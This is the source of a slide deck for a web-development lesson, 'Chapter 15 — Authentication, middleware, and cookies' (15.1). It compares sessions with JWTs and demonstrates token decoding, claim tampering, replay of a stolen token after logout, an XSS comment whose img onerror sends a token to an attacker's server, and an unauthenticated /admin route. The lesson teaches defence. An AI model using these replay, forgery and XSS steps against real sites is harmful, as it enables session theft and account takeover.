      ['The browser holds', 'a random <b>id</b> (<code>sid</code>)', 'the <b>whole claim</b>, signed'],
      ['Each request', 'look the id up in a store', 'verify the signature — no lookup'],
      ['Log out / ban', 'delete the row ⇒ <b>dead at once</b>', 'nothing to delete ⇒ valid <b>until exp</b>'],
      ['Server needs', 'storage (DB, Redis)', 'only the secret key'],
      ['Fits', 'one app, easy revoke', 'many services, stateless'],
    ]), 'r50'),
    en: 'Two questions: authentication, who you are, proved once at login; and authorisation, may you do this, decided on every action. Two models answer the first. A server session hands the browser a random id and looks it up each time; logging out deletes the row. A JWT carries the whole claim, signed; the server only verifies the signature, so there is nothing to delete.' },
  { t: 'The four steps of an authenticated request', body: seq(['Browser', 'Next.js server', 'Store / key'], [
      [0, 1, '① POST /api/login  { name, password }'],
      [1, 2, 'check the password', '#475569'],
      [1, 0, 'Set-Cookie: token=eyJ…; HttpOnly; SameSite=Lax', '#0070f3'],
      [0, 1, '② GET /api/me — the cookie rides along by itself', '#0070f3'],
      [1, 1, '③ verify the signature (or look up the sid)', '#16a34a'],
      [1, 2, '④ may An read THIS row? scope the query', '#7c3aed'],
      [1, 0, '200 { user } — or 401', '#475569', true],
    ], { rh: 46, fs: 18 }) + box('HTTP has no memory', 'Steps ② – ④ repeat on <b>every</b> request. A check in the UI is a courtesy; the check on the server is the control.', 'xanh'),
    en: 'The four steps of an authenticated request. One: identify once, at login; the server answers with a Set-Cookie. Two: the browser carries the cookie on every request by itself. Three: the server verifies it, every time. Four: authorise per resource, scoping the query to the caller. HTTP has no memory, so two to four repeat on every request.' },
  { t: 'Measured: a JWT is signed, not encrypted', body: two(D(tn(['$ curl -si -X POST /api/login -d \'{"name":"An"}\'', ...SC, ...LEN, '$ node -e "…decode…"   # no key needed', ...DEC].join('\n'), { fs: 13, wrap: 62, title: 'curl + node (real)' })),
    D(tn(['# Binh (user) edits his own payload', ...TAMPER.map((l) => l.replace('gốc', 'orig').replace('sửa', 'edit')), '$ curl /api/me -H "Cookie: token=$FORGED"', ...FORGED, '# server log', ...LOG].join('\n'), { fs: 13, wrap: 58, title: 'tamper (real)' }),
      box('Read it', 'Anyone can <b>read</b> a JWT — base64url, not a secret. Nobody can <b>change</b> it without the key: one edited field ⇒ the signature no longer matches ⇒ 401. Never put a password or anything private in the payload.', 'do2')), 'r50'),
    en: 'Measured: a JWT is signed, not encrypted. Logging in sets an httpOnly cookie holding a hundred sixty-one character token. Decoding it needs no key: the header says HS256, the payload says An, role admin, subject one, and the expiry. Binh edits his own payload to role admin and keeps the signature: the server answers 401, signature verification failed.' },
  { t: 'Measured: log out, then use a stolen copy', body: two(tn(THUHOI, { fs: 15, wrap: 64, title: 'curl (real)' }),
    D(box('JWT: logout only deletes the browser\'s copy', `The browser gets <b>${so[0]}</b> — its cookie is gone. A copy taken before logout still gets <b>${so[1]}</b>: the server has no list to strike it from. It stays valid until <code>exp</code>.`, 'do2'),
      box('Session: logout deletes the row', `The same stolen copy of <code>sid</code> gets <b>${so[2]}</b> at once — the lookup fails. That is what "easy to revoke" means.`, 'xanh'),
      box('So with JWTs', 'keep <code>exp</code> short and add refresh (15.5), or keep a deny-list — which is a lookup again.', 'lam')), 'r56'),
    en: 'Measured: log out, then use a stolen copy. With a JWT the browser\'s request after logout gets 401, because its cookie is gone; but a copy taken before logout still gets 200 — the server has nothing to strike it from. With a server session, the same stolen copy gets 401 at once, because logout deleted the row.' },
  { t: 'Where the proof lives: localStorage vs an httpOnly cookie', body: two(D(B('ls', { url: 'localhost:3000/dangnhap · token in localStorage', h: 180, w: 540, mark: [[12, 114, 230, 20, ''], [12, 154, 520, 20, '']] }), box('localStorage', 'Your code must <b>attach</b> it (<code>Authorization: Bearer</code>) — without it: 401. And <b>any script</b> on the page can read it.', 'do2')),
    D(B('ck', { url: 'localhost:3000/dangnhap · token in an httpOnly cookie', h: 180, w: 540, mark: [[12, 114, 230, 20, ''], [12, 134, 330, 20, '']] }), box('httpOnly cookie', 'Sent by the browser <b>by itself</b>: 200 with no header. <code>document.cookie</code> is <b>""</b> — JavaScript cannot see it.', 'xanh')))
    + cmp(['', 'localStorage', 'httpOnly cookie'], [['Readable by any script', '<b style="color:#c0392b">yes</b>', 'no'], ['Sent with each request', 'only if your code adds it', '<b>by the browser</b>'], ['What an XSS can do', '<b style="color:#c0392b">copy it away</b>', 'use it while the page is open']]),
    en: 'Where the proof lives, measured in Chromium. With the token in localStorage, the request needs our code to attach a Bearer header; without it the answer is 401. And any script can read it. With an httpOnly cookie, the browser sends it by itself, 200 with no header, and document dot cookie is empty: JavaScript cannot see it.' },
  { t: 'Measured: one XSS, two storage choices', body: two(D(tsx(PAYLOAD, { sm: true, title: "the attacker's comment (rendered as HTML)" }), B('xss-ck', { url: 'localhost:3000/xss', h: 140, w: 540 })),
    D(tn(['# the attacker\'s server received', ...LOOT, '$ curl /api/me -H "Authorization: Bearer $STOLEN"', '# — from the attacker\'s own machine', ...REPLAY].join('\n'), { fs: 13, wrap: 58, title: 'loot (real)' }),
      box('localStorage', 'The token is <b>stolen</b> and replayed from anywhere: 200, until it expires.', 'do2'),
      box('httpOnly cookie', 'Nothing to steal (<code>null</code>, <code>""</code>) — but the script still <b>acts as An</b> while the page is open (<code>"via":"cookie"</code>).', 'lam')), 'r50'),
    en: 'Measured: one XSS, two storage choices. A comment rendered as HTML carries an image whose onerror runs the attacker\'s script. With localStorage, the token is stolen and replayed from the attacker\'s own machine: 200. With an httpOnly cookie, there is nothing to steal; but the script can still act as An while the page is open.' },
  { t: 'The rule, and what it does not cover', body: icards([
      ['lock', 'httpOnly', 'JavaScript cannot read it ⇒ an XSS cannot <b>carry the token away</b>.'],
      ['shield', 'secure', 'Sent over HTTPS only. On in production; <code>localhost</code> is treated as secure (15.2).'],
      ['link', 'sameSite = lax', 'Not sent on a cross-site POST ⇒ the first line against CSRF (15.2).'],
      ['clock', 'maxAge + exp', 'Two clocks: the cookie\'s life and the token\'s (15.5).'],
    ], 2) + two(box('Rule', 'Auth tokens live in an <b>httpOnly, secure, sameSite</b> cookie — never in <code>localStorage</code> "because it is easier to read".', 'xanh'),
      box('Not a cure for XSS', 'httpOnly turns "steal the session" into "use it while the page is open". Fix the XSS itself: never render user HTML (<code>dangerouslySetInnerHTML</code>) unsanitised.', 'do2')),
    en: 'The rule: auth tokens live in an httpOnly, secure, sameSite cookie. httpOnly stops a script carrying the token away; secure sends it over HTTPS only; sameSite lax keeps it off cross-site POSTs. But httpOnly is not a cure for XSS: it turns stealing the session into using it while the page is open. Fix the XSS itself.' },
  { t: 'Trap: a route protected only by a hidden link', body: two(D(tn(['# nothing links to /admin — but anyone can type it', '$ curl -si localhost:3000/admin', ...ADM, '$ curl -si localhost:3000/admin2', ...ADM2, '$ curl -si localhost:3000/admin2 -H "Cookie: token=$AN"', ...ADM3].join('\n'), { fs: 14, wrap: 60, title: 'curl (real)' }),
      box('/admin', 'A Server Component: it renders the revenue on the server for <b>anyone</b> — no click, no JavaScript, just <code>curl</code>.', 'do2')),
    D(tsx(ADMIN2, { sm: true, hl: [6, 7, 8] }), box('/admin2 — the page checks itself', 'No valid admin token ⇒ <code>redirect(\'/login\')</code> ⇒ <b>307</b> before any data is read. Middleware (15.3) is a convenience in front of this, not a replacement.', 'xanh')), 'r50'),
    en: 'The trap: a route protected only by a hidden link. Nothing links to slash admin, but anyone can type it; curl gets 200 with the revenue, rendered on the server. Slash admin two checks the token itself and redirects to login with a 307 before reading any data. With An\'s token it answers 200.' },
  { t: 'cuongthai.com: the token lives in an httpOnly cookie', body: two(D(tn(KHO.split('\n').filter((l) => !/^\$ grep -rnE/.test(l)).join('\n'), { fs: 13, wrap: 74, title: 'frontend/ + .env.example (real)' })),
    D(box('backend_token', '<code>httpOnly: true</code>, <code>secure</code> in production, <code>sameSite: "lax"</code>, 30 days, <code>path: "/"</code> — exactly the flags of this lesson.', 'xanh'),
      box('Not in localStorage', 'The persisted auth store keeps the user, <b>not</b> the token (comment in <code>authStore.ts</code>); <b>0</b> places call <code>localStorage.setItem(token…)</code>.', 'lam'),
      box('Two clocks', 'The JWT itself expires in <code>24h</code> (<code>JWT_EXPIRES_IN</code>) while the cookie lives 30 days — lesson 15.5 is what happens when nothing renews it.', 'do2')), 'r56'),
    en: 'cuongthai.com keeps its token in an httpOnly cookie named backend token: httpOnly, secure in production, same site lax, thirty days. The persisted auth store keeps the user but not the token, and no file stores a token in localStorage. And there are two clocks: the JWT itself expires in twenty-four hours, which lesson fifteen point five comes back to.' },
  { t: 'Key terms of this lesson', body: `<div style="display:flex;flex-wrap:wrap;gap:12px">${[
      kw('Authentication', 'who you are'), kw('Authorisation', 'what you may do'), kw('Session', 'an id, looked up'), kw('JWT', 'a signed, self-contained token'),
      kw('Claim / payload', 'readable by anyone'), kw('Signature', 'detects any change'), kw('httpOnly cookie', 'JS cannot read it'), kw('XSS', 'someone else\'s script in your page'),
      kw('Revocation', 'killing a session early'), kw('Bearer token', 'attached by your code'),
    ].join('')}</div>`, to: true,
    en: 'Key terms: authentication; authorisation; session; JWT; claim or payload, readable by anyone; signature, which detects any change; httpOnly cookie; XSS; revocation; and bearer token, attached by your own code.' },
  { t: 'Your turn — and what to keep', body: two(steps([
      `Log in with ${c('curl -si')}, copy the ${c('Set-Cookie')}, decode the JWT with no key`,
      `Edit one claim, keep the signature, call ${c('/api/me')} — expect ${c('401')}`,
      `Log out, replay your copy: JWT vs session`,
      `Render one comment with ${c('dangerouslySetInnerHTML')}; compare what an XSS steals from localStorage and from an httpOnly cookie`,
    ]), box('Keep these', `<ul><li>A JWT is signed, not secret</li><li>Logout does not kill a stolen JWT</li><li>Token ⇒ httpOnly, secure, sameSite cookie</li><li>httpOnly limits theft, not XSS</li><li>The page that owns the data checks the session</li></ul>`, 'lam'), ''),
    en: 'Your turn: log in with curl and decode the JWT with no key; edit one claim and expect 401; log out and replay your copy under both models; and run one XSS against both storage choices. Keep: a JWT is signed, not secret; logout does not kill a stolen JWT; the token lives in an httpOnly cookie; and the page that owns the data checks the session.' },
];
export const slides = lamDeck({ chuong: 'Chapter 15 — Authentication, middleware, and cookies', bai: '15.1' }, S);
